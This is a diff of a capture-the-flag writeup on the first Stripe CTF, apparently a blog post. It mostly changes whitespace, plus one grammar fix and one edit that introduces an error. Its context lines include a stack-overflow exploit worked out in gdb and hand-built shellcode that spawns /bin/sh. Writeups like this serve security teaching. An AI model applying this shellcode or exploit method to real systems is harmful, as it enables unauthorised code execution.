@@ -4,7 +4,7 @@ Category:  Vulnerabilities
 Tags: SQLi, PHP, Wargames, CTF, Burp, curl, assembly, shellcode, gdb, C, objdump, Timing_attack, Buffer_overflow, Stack_overflow, Python, Stripe
 
 
-Although I did not have the chance of playing in neither of the [three](https://stripe.com/blog/capture-the-flag) [Stripe](https://stripe.com/blog/capture-the-flag-20) [CTFs](https://stripe.com/blog/ctf3-launch), I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.
+Although I did not have the chance of playing in either of the [three](https://stripe.com/blog/capture-the-flag) [Stripe](https://stripe.com/blog/capture-the-flag-20) [CTFs](https://stripe.com/blog/ctf3-launch), I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.
 
 
 This post is about the first [Stripe](https://stripe.com/) CTF, which [happened in the beginning of 2012](https://stripe.com/blog/capture-the-flag-wrap-up). I was able to fully reproduce the game by using a [Live CD Image](http://www.janosgyerik.com/hacking-contest-on-a-live-cd/). Other options were [direct download and BitTorrent](https://stripe.com/blog/capture-the-flag-wrap-up).
@@ -79,7 +79,7 @@ Inspecting closely the code we see that the client's cookie is read without sani
 And then the results of this read is printed:
 ```
 <html>
-	<p><?php echo $out ?></p>
+    <p><?php echo $out ?></p>
 </html>
 ```
 
@@ -231,14 +231,14 @@ To understand this problem we need to understand the [design of the stack frame]
 
 ```
 (gdb) p  &buf
-	(char (*)[64]) 0xffbffa00
+    (char (*)[64]) 0xffbffa00
 ```
 
 3) We  check **index** (where 4 is **sizeof(*fns)**), and subtract **buf** from to the pointer to **fns**:
 
 ```
 (gdb) p (0xffbffa6c - 0xffbffa00)/4
-	27
+    27
 ```
 So running an argument such as */level/level03 -27 foo* calls **fns[-27]** which is **&fns-27** times the size of the pointer.
 
@@ -315,7 +315,7 @@ int main()
 With  the following **Makefile** (I tend to write Makefiles for anything I compile in C):
 ```
 shell: simplest_shellcode.c
-	gcc -static -g -o shell simplest_shellcode.c
+    gcc -static -g -o shell simplest_shellcode.c
 ```
 
 Running **make** will give us our executable **shell**.  Now, let's fire up **gdb**:
@@ -324,53 +324,53 @@ Running **make** will give us our executable **shell**.  Now, let's fire up **gd
 $ gdb shell
 (gdb) disas main
 Dump of assembler code for function main:
-   0x00000000004004d0 <+0>:	push   %rbp
-   0x00000000004004d1 <+1>:	mov    %rsp,%rbp
-   0x00000000004004d4 <+4>:	sub    $0x10,%rsp
-   0x00000000004004d8 <+8>:	movq   $0x482be4,-0x10(%rbp)
-   0x00000000004004e0 <+16>:	movq   $0x0,-0x8(%rbp)
-   0x00000000004004e8 <+24>:	mov    -0x10(%rbp),%rax
-   0x00000000004004ec <+28>:	lea    -0x10(%rbp),%rcx
-   0x00000000004004f0 <+32>:	mov    $0x0,%edx
-   0x00000000004004f5 <+37>:	mov    %rcx,%rsi
-   0x00000000004004f8 <+40>:	mov    %rax,%rdi
-   0x00000000004004fb <+43>:	callq  0x40c540 <execve>
-   0x0000000000400500 <+48>:	mov    $0x0,%edi
-   0x0000000000400505 <+53>:	callq  0x400e60 <exit>
+   0x00000000004004d0 <+0>:    push   %rbp
+   0x00000000004004d1 <+1>:    mov    %rsp,%rbp
+   0x00000000004004d4 <+4>:    sub    $0x10,%rsp
+   0x00000000004004d8 <+8>:    movq   $0x482be4,-0x10(%rbp)
+   0x00000000004004e0 <+16>:    movq   $0x0,-0x8(%rbp)
+   0x00000000004004e8 <+24>:    mov    -0x10(%rbp),%rax
+   0x00000000004004ec <+28>:    lea    -0x10(%rbp),%rcx
+   0x00000000004004f0 <+32>:    mov    $0x0,%edx
+   0x00000000004004f5 <+37>:    mov    %rcx,%rsi
+   0x00000000004004f8 <+40>:    mov    %rax,%rdi
+   0x00000000004004fb <+43>:    callq  0x40c540 <execve>
+   0x0000000000400500 <+48>:    mov    $0x0,%edi
+   0x0000000000400505 <+53>:    callq  0x400e60 <exit>
 End of assembler dump.
 ```
 
 The first line is updating the frame stack pointer (**%rsp**), moving it to the top of the stack:
 ```
-0x00000000004004d0 <+0>:	push   %rbp
-0x00000000004004d1 <+1>:	mov    %rsp,%rbp
+0x00000000004004d0 <+0>:    push   %rbp
+0x00000000004004d1 <+1>:    mov    %rsp,%rbp
 ```
 
 
 Then it subtracts 16 bytes from **%rsp**, with 8 bytes of padding:
 ```
-0x00000000004004d4 <+4>:	sub    $0x10,%rsp
+0x00000000004004d4 <+4>:    sub    $0x10,%rsp
 ```
 
 We see this address **0x482be4** being moved to **%rsp**:
 ```
-0x00000000004004d8 <+8>:	movq   $0x482be4,-0x10(%rbp)
+0x00000000004004d8 <+8>:    movq   $0x482be4,-0x10(%rbp)
 ```
 
 It should be a pointer to ```/bin/sh```, and we can be sure by  asking gdb:
 ```
 (gdb) x/1s 0x482be4
-0x482be4:	 "/bin/sh"
+0x482be4:     "/bin/sh"
 ```
 
 After that, **NULL** is pushed in:
 ```
-0x00000000004004f0 <+32>:	mov    $0x0,%edx
+0x00000000004004f0 <+32>:    mov    $0x0,%edx
 ```
 
 Finally, **execve** is executed:
 ```
-0x00000000004004fb <+43>:	callq  0x40c540 <execve>
+0x00000000004004fb <+43>:    callq  0x40c540 <execve>
 ```
 
 ### Writing the Shellcode in Assembly
@@ -424,17 +424,17 @@ $ objdump -d shell
 shell:     file format elf32-i386
 Disassembly of section .text:
 08048054 <_start>:
- 8048054:	31 c0                	xor    %eax,%eax
- 8048056:	50                   	push   %eax
- 8048057:	68 2f 2f 73 68       	push   $0x68732f2f
- 804805c:	68 2f 62 69 6e       	push   $0x6e69622f
- 8048061:	89 e3                	mov    %esp,%ebx
- 8048063:	50                   	push   %eax
- 8048064:	53                   	push   %ebx
- 8048065:	89 e1                	mov    %esp,%ecx
- 8048067:	31 d2                	xor    %edx,%edx
- 8048069:	b0 0b                	mov    $0xb,%al
- 804806b:	cd 80                	int    $0x80
+ 8048054:    31 c0                    xor    %eax,%eax
+ 8048056:    50                       push   %eax
+ 8048057:    68 2f 2f 73 68           push   $0x68732f2f
+ 804805c:    68 2f 62 69 6e           push   $0x6e69622f
+ 8048061:    89 e3                    mov    %esp,%ebx
+ 8048063:    50                       push   %eax
+ 8048064:    53                       push   %ebx
+ 8048065:    89 e1                    mov    %esp,%ecx
+ 8048067:    31 d2                    xor    %edx,%edx
+ 8048069:    b0 0b                    mov    $0xb,%al
+ 804806b:    cd 80                    int    $0x80
 ```
 
 Which in the little-endian representation is:
@@ -476,7 +476,7 @@ $ ruby -e 'print "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x
 ---
 ## Level 5:  Unpickle exploit
 
-The fifth level is an uppercasing **web service** written in Python, which is split into an HTTP part, and a worker queue part.
+The fifth level is a uppercasing **web service** written in Python, which is split into an HTTP part, and a worker queue part.
 
 In this service, a request can be sent  with:
 
